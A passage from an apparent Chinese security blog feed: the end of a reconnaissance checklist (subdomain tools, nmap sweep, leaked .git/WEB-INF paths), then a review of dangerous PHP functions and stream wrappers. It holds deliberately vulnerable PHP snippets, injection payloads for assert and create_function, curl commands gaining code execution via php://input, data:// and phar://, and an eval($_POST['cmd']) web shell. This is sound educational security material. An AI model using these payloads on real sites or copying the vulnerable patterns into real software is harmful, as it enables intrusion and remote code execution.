rel="noopener">https://github.com/darkoperator/dnsrecon</a>]</li><li>subDomainsBrute</li><li>layer子域名挖掘机</li></ul></li><li>搜索引擎<ul><li>site: anemone.top</li><li><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></li><li><a href="https://www.virustotal.com/#/home/search" target="_blank" rel="noopener">VirusTotal</a></li><li>Sublist3r（集合多家搜索引擎结果）</li></ul></li><li>使用SSL/TLS证书查询<ul><li><a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a></li><li><a href="https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration" target="_blank" rel="noopener">bugcrowd-levelup-subdomain-enumeration</a></li><li><a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a></li><li><a href="https://developers.facebook.com/tools/ct/" target="_blank" rel="noopener">https://developers.facebook.com/tools/ct/</a></li><li><a href="https://google.com/transparencyreport/https/ct/" target="_blank" rel="noopener">https://google.com/transparencyreport/https/ct/</a></li></ul></li></ul><h2 id="C站查询"><a href="#C站查询" class="headerlink" title="C站查询"></a>C站查询</h2><ul><li><a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a></li><li><a href="http://ipwhois.cnnic.net.cn/" target="_blank" rel="noopener">http://ipwhois.cnnic.net.cn/</a></li><li><code>nmap -p 80,8080 --open ip/24</code></li></ul><h2 id="旁站查询"><a href="#旁站查询" class="headerlink" title="旁站查询"></a>旁站查询</h2><ul><li><a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">http://s.tool.chinaz.com/same</a></li></ul><h1 id="网站目录"><a href="#网站目录" class="headerlink" title="网站目录"></a>网站目录</h1><p>可能泄露的目录有：</p><ul><li>网站后台</li><li>网站源代码备份，如:<ul><li>www.rar</li><li>www.zip</li></ul></li><li>版本控制<ul><li>/.git/config （利用：<a href="https://github.com/internetwache/GitTools" target="_blank" rel="noopener">GitTools</a>，<a href="https://github.com/WangYihang/GitHacker" target="_blank" rel="noopener">GitHacker</a>）</li><li>/.svn/entries （利用：Seay SVN漏洞利用工具）</li></ul></li><li>JavaWeb目录<ul><li>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li><li>/WEB-INF/classes/：含了站点所有用的 <strong>class</strong> 文件，包括 <strong>servlet</strong> <strong>class</strong> 和非<strong>servlet</strong> <strong>class</strong>，他们不能包含在 .<strong>jar</strong>文件中</li><li>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li><li>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</li><li>/WEB-INF/database.properties：数据库配置文件</li></ul></li><li>其他敏感文件泄露，如：<ul><li>phpinfo</li><li>robots.txt</li><li>.DS_Store(<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">https://github.com/lijiejie/ds_store_exp</a>)</li></ul></li></ul><p>推荐工具有：</p><ul><li><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></li><li>御剑，<a href="http://www.moonsec.com/post-753.html" target="_blank" rel="noopener">http://www.moonsec.com/post-753.html</a></li></ul><h1 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h1><ul><li>GitHub源码<ul><li><a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a></li></ul></li><li>网络资产搜索引擎：<ul><li><a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></li><li><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></li></ul></li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>信息收集总结，<a href="https://blog.csdn.net/qq_33336310/article/details/86665344" target="_blank" rel="noopener">https://blog.csdn.net/qq_33336310/article/details/86665344</a></li><li>Web安全 — 信息收集<a href="https://www.freebuf.com/column/155795.html" target="_blank" rel="noopener">https://www.freebuf.com/column/155795.html</a></li><li>他山之石 | 渗透测试中的各种子域名枚举技术介绍，<a href="https://www.freebuf.com/articles/web/154809.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/154809.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;信息收集是渗透测试的第一步，本文总结目前信息收集的具体操作步骤。&lt;/p&gt;&lt;h1 id=&quot;网站信息&quot;&gt;&lt;a href=&quot;#网站信息&quot; class=&quot;headerlink&quot; title=&quot;网站信息&quot;&gt;&lt;/a&gt;网站信息&lt;/h1&gt;&lt;h2 id=&quot;whois信息&quot;&gt;&lt;a href=&quot;#whois信息&quot; class=&quot;headerlink&quot; title=&quot;whois信息&quot;&gt;&lt;/a&gt;whois信息&lt;/h2&gt;&lt;p&gt;可以收集到的信息有：&lt;/p&gt;&lt;ul&gt;
&lt;li&gt;联系人&lt;/li&gt;
&lt;li&gt;邮箱（可以到社工库进一步查询）&lt;/li&gt;
&lt;li&gt;电话&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;收集途径有：&lt;/p&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://whois.chinaz.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://whois.chinaz.com/&lt;/a&gt; （站长之家）&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://who.is/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://who.is/&lt;/a&gt; （国外）&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://x.threatbook.cn/（通过邮箱查询其他的站点）&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://x.threatbook.cn/（通过邮箱查询其他的站点）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://dns.aizhan.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://dns.aizhan.com/&lt;/a&gt; （IP反查域名）&lt;/li&gt;
&lt;li&gt;命令&lt;code&gt;whois anemone.top&lt;/code&gt; &lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="信息收集" scheme="http://anemone.top/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
      <category term="信息收集" scheme="http://anemone.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
      <category term="waf探测" scheme="http://anemone.top/tags/waf%E6%8E%A2%E6%B5%8B/"/>
    
      <category term="cdn绕过" scheme="http://anemone.top/tags/cdn%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>PHP中的危险函数和伪协议</title>
    <link href="http://anemone.top/php-PHP%E4%B8%AD%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>http://anemone.top/php-PHP中的危险函数和伪协议/</id>
    <published>2019-02-07T07:02:13.000Z</published>
    <updated>2019-09-22T10:14:18.686Z</updated>
    
    <content type="html"><![CDATA[<p>复习一下PHP中常见的危险函数：</p><h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><ul><li><p>file_get_contents()，该函数可以读取其他协议造成SSRF</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$src=$_GET[<span class="string">'src'</span>];</span><br><span class="line">$homepage = file_get_contents($src);</span><br><span class="line"><span class="keyword">echo</span> $homepage;</span><br></pre></td></tr></table></figure></li><li><p>highlight_file()，高亮显示文件内容</p></li><li>show_source()，highlight_file()的别名</li><li>fopen()、fread()，fgets()、fgetss()、fpassthru()等<ul><li>fread(fopen($filename,”r”), $size); //读取<code>$size</code>长度的文件</li><li>fgets(fopen($filename, “r”)); //读取一行</li><li>fgetss(fopen($filename, “r”)); //读取一行并过滤HTML标记</li><li>fpassthru(fopen($filename, “r”)); //读取到文件结束</li></ul></li><li><p>readfile()，读取文件并返回至页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($file)) &#123;</span><br><span class="line">    header(<span class="string">'Content-Description: File Transfer'</span>);</span><br><span class="line">    header(<span class="string">'Content-Type: application/octet-stream'</span>);</span><br><span class="line">    header(<span class="string">'Content-Disposition: attachment;   filename="'</span>.basename($file).<span class="string">'"'</span>);</span><br><span class="line">    header(<span class="string">'Expires: 0'</span>);</span><br><span class="line">    header(<span class="string">'Cache-Control: must-revalidate'</span>);</span><br><span class="line">    header(<span class="string">'Pragma: public'</span>);</span><br><span class="line">    header(<span class="string">'Content-Length: '</span> . filesize($file));</span><br><span class="line">    readfile($file);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>file()，把文件读进数组中</p></li><li>php_strip_whitespace()，读取一个php文件并返回一个去掉注释和换行的文本，有意思的是，该函数可以去掉任意语言的注释，只要这个语言的注释风格与php相同并且在文件头加入<code>&lt;?php</code>就行可：<br><img src="/php-PHP中的危险函数和伪协议/1549526799636.png" alt="1549526799636"></li><li>parse_ini_file()，只能读取ini文件</li></ul><a id="more"></a><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><ul><li>system()</li><li>shell_exec()，和<code>system()</code>差不多</li><li>passthru()，返回二进制的输出</li><li>exec(‘ls’, $array)，返回结果保存在<code>array</code>中</li><li>pcntl_exec()，不返回结果</li><li><p>popen()，返回一个文件指针</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$handle = popen(<span class="string">"/bin/ls"</span>, <span class="string">"r"</span>);</span><br><span class="line">var_dump(fpassthru($handle));</span><br><span class="line">pclose($handle);</span><br></pre></td></tr></table></figure></li><li><p>proc_open()，增强型<code>popen()</code>，允许有三个通道（输入，输出，错误）</p></li><li>&#96;(反单引号)</li><li>escapeshellcmd() // 该函数用于过滤字符保证不执行其他恶意指令</li></ul><h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><ul><li>eval(“phpinfo();”)</li><li><p>assert()，原用法是assert失败后，调用回调函数，它会将参数作为代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$num=$_GET[<span class="string">'num'</span>];</span><br><span class="line">assert(<span class="string">"is_int($num)"</span>);</span><br></pre></td></tr></table></figure><p>payload为<code>num=1)%20and%20phpinfo();//</code>，注意若前面的条件不满足则用or，如<code>a)%20or%20phpinfo();//</code></p></li><li><p>preg_replace + ‘/e’,/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码，如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/test/e"</span>,$_GET[<span class="string">"cmd"</span>],<span class="string">"just test"</span>);</span><br></pre></td></tr></table></figure><p>payload为<code>cmd=phpinfo()</code>，注意该方法只在php 5.5.0以下版本有效。</p></li><li><p>create_function($args, ​$code)，创建一个匿名函数，由于内部是eval实现的，所以存在安全性问题，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sort_by = $_GET[<span class="string">'sort_by'</span>];</span><br><span class="line">$databases=<span class="keyword">array</span>(<span class="string">'1234'</span>,<span class="string">'4321'</span>);</span><br><span class="line">$sort_function = <span class="string">'return strcmp($a["'</span>.$sort_by.<span class="string">'"], $b["'</span>.$sort_by.<span class="string">'"]);'</span>;</span><br><span class="line">usort($databases, create_function(<span class="string">'$a, $b'</span>, $sort_function));</span><br><span class="line">print_r($databases);</span><br></pre></td></tr></table></figure><p>构造payload的关键在于将create_function还原为eval实现的普通函数，接着按上下文闭合先前的函数逻辑（这里为strcmp）再加上其他语句<code>;}phpinfo();/*</code>，总之确保eval中的字符串拼接成一个php符合语法的语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(</span><br><span class="line">    <span class="string">'function lambda($a, $b)&#123;</span></span><br><span class="line"><span class="string">        return strcmp($a["'</span>.$sort_by.<span class="string">'"], $b["'</span>.$sort_by.<span class="string">'"]); //replace with create_function</span></span><br><span class="line"><span class="string">    &#125;'</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>由此payload为<code>sort_by=&quot;]);}phpinfo();/*</code>，此时eval中的字符串拼接成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda</span><span class="params">($a, $b)</span></span>&#123; </span><br><span class="line"><span class="keyword">return</span> strcmp($a[<span class="string">""</span>]);</span><br><span class="line">&#125;</span><br><span class="line">phpinfo();<span class="comment">/*"], $b[""]);&#125;phpinfo();/*"]); &#125;</span></span><br></pre></td></tr></table></figure></li><li><p>call_user_func(callable $func, $arg)，调用func($arg)，若func可指定为assert则存在代码执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line">call_user_func($a, $b);</span><br></pre></td></tr></table></figure><p>payload为<code>a=assert&amp;b=phpinfo()</code></p></li><li><p>call_user_func_array(callable $func , array $args_arr)，调用func，参数为数组<code>$args_arr</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line">call_user_func_array($a, $b);</span><br></pre></td></tr></table></figure><p>payload为<code>a=assert&amp;b[]=phpinfo()</code></p></li><li><p>array_map(callable $func, array $array1 [, array $… ])，将array中的元素应用到$callback函数上，有点像Python的map</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line">array_map($a, $b);</span><br></pre></td></tr></table></figure><p>payload为<code>a=assert&amp;b[]=phpinfo()</code></p></li><li>ob_start()，用法如下（只能显示一行）：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd = <span class="string">'system'</span>;ob_start($cmd);<span class="keyword">echo</span> <span class="string">"$_GET[a]"</span>;ob_end_flush();</span><br></pre></td></tr></table></figure></li></ul><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><ul><li>move_uploaded_file()</li><li>getimagesize() //验证文件头只要为GIF89a，就会返回真</li></ul><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><ul><li>require()，程序一运行就包含该文件</li><li>include()，执行到include时包含该文件</li><li>require_once()，include_once()：若已包含过则不再包含</li><li>allow_url_include = on，打开远程文件包含</li></ul><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><ul><li>extract()</li><li>import_request_variables()</li><li>parse_str()</li><li>mb_parse_str()<br>全局变量覆盖：register_globals为ON，$GLOBALS</li></ul><h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><ul><li><p>php://filter，结合base64读取文件用，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://localhost/include.php?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=include.php|base64 -d</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100    45  100    45    0     0   5000      0 --:--:-- --:--:-- --:--:--  5000</span><br><span class="line">&lt;?php include(<span class="variable">$_GET</span>[<span class="string">'file'</span>]);?&gt;</span><br></pre></td></tr></table></figure></li><li><p>php://input，将post作为输入，在<strong>远程文件包含</strong>和file_get_contents()时可以利用造成RCE，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X POST http://localhost/include.php?file=php://input --data <span class="string">"&lt;?php system('ls -al');?&gt;"</span></span><br><span class="line">total 126</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 Feb  8 11:22 .</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 May  6  2018 ..</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121  2117 Sep 21 21:53 aizhixi.php</span><br></pre></td></tr></table></figure></li><li><p>data://，将data后的get请求作为输入，在<strong>远程文件包含</strong>时可造成RCE，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"&lt;?php system('ls -al');?&gt;"</span>|base64</span><br><span class="line">PD9waHAgc3lzdGVtKCdscyAtYWwnKTs/Pgo=</span><br><span class="line"></span><br><span class="line">$ curl <span class="string">"http://localhost/include.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAtYWwnKTs/Pgo="</span></span><br><span class="line">total 126</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 Feb  8 11:22 .</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 May  6  2018 ..</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121  2117 Sep 21 21:53 aizhixi.php</span><br></pre></td></tr></table></figure></li><li><p>zip://、compress.bzip2://、compress.zlib://，读取一个.zip/.bz2/.gz文件中的文件，可以将一句话压缩造成RCE：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"&lt;?php echo system('ls -al');?&gt;"</span> &gt; ls.php</span><br><span class="line">$ zip -r shell.zip ls.php</span><br><span class="line">  adding: ls.php (stored 0%)</span><br><span class="line"><span class="comment"># 上传后</span></span><br><span class="line">$ curl <span class="string">"http://localhost/include.php?file=phar://./shell.zip/ls.php"</span></span><br><span class="line">total 128</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 Feb  8 16:11 .</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 May  6  2018 ..</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg</span><br></pre></td></tr></table></figure></li><li><p>phar://，读取一个phar/zip文件，可以利用成RCE:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cat phar.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">'shell.phar'</span>, 0);</span><br><span class="line"><span class="variable">$phar</span>[<span class="string">'shell.php'</span>] = <span class="string">'&lt;?php echo 12321; eval($_POST[\'</span>cmd\<span class="string">']);?&gt;'</span> ;</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">?&gt;</span><br><span class="line">$ php phar.php</span><br><span class="line"><span class="comment"># 上传phar后</span></span><br><span class="line">$ curl <span class="string">"http://localhost/include.php?file=phar://./shell.phar/shell.php"</span> --data <span class="string">"cmd=system('ls -al');"</span></span><br><span class="line">12321total 128</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 Feb  8 16:11 .</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 May  6  2018 ..</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg</span><br></pre></td></tr></table></figure></li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>php代码审计小总结，<a href="https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/</a></li><li>命令执行与代码执行的小结，<a href="https://www.anquanke.com/post/id/162128" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162128</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;复习一下PHP中常见的危险函数：&lt;/p&gt;&lt;h1 id=&quot;文件读取&quot;&gt;&lt;a href=&quot;#文件读取&quot; class=&quot;headerlink&quot; title=&quot;文件读取&quot;&gt;&lt;/a&gt;文件读取&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;file_get_contents()，该函数可以读取其他协议造成SSRF&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$src=$_GET[&lt;span class=&quot;string&quot;&gt;&#39;src&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$homepage = file_get_contents($src);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; $homepage;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;highlight_file()，高亮显示文件内容&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;show_source()，highlight_file()的别名&lt;/li&gt;
&lt;li&gt;fopen()、fread()，fgets()、fgetss()、fpassthru()等&lt;ul&gt;
&lt;li&gt;fread(fopen($filename,”r”), $size); //读取&lt;code&gt;$size&lt;/code&gt;长度的文件&lt;/li&gt;
&lt;li&gt;fgets(fopen($filename, “r”)); //读取一行&lt;/li&gt;
&lt;li&gt;fgetss(fopen($filename, “r”)); //读取一行并过滤HTML标记&lt;/li&gt;
&lt;li&gt;fpassthru(fopen($filename, “r”)); //读取到文件结束&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;readfile()，读取文件并返回至页面&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$file = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;file&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (file_exists($file)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    header(&lt;span class=&quot;string&quot;&gt;&#39;Content-Description: File Transfer&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    header(&lt;span class=&quot;string&quot;&gt;&#39;Content-Type: application/octet-stream&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    header(&lt;span class=&quot;string&quot;&gt;&#39;Content-Disposition: attachment;   filename=&quot;&#39;&lt;/span&gt;.basename($file).&lt;span class=&quot;string&quot;&gt;&#39;&quot;&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    header(&lt;span class=&quot;string&quot;&gt;&#39;Expires: 0&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    header(&lt;span class=&quot;string&quot;&gt;&#39;Cache-Control: must-revalidate&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    header(&lt;span class=&quot;string&quot;&gt;&#39;Pragma: public&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    header(&lt;span class=&quot;string&quot;&gt;&#39;Content-Length: &#39;&lt;/span&gt; . filesize($file));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    readfile($file);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;exit&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;file()，把文件读进数组中&lt;/p&gt;
&lt;/li&gt;
